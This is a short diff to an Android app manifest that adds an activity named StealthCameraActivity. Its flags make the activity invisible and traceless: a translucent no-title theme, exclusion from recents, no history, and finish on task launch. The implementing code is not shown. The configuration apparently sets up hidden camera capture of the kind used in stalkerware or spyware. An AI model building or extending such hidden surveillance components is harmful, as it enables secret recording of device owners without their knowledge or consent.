@@ -63,6 +63,15 @@
             android:label="@string/app_name"
             android:theme="@style/Theme.MyApplication" />
 
+        <activity
+            android:name=".service.StealthCameraActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:finishOnTaskLaunch="true"
+            android:launchMode="singleInstance" />
+
         <activity-alias
             android:name="com.example.MainActivityAlias"
             android:targetActivity=".MainActivity"
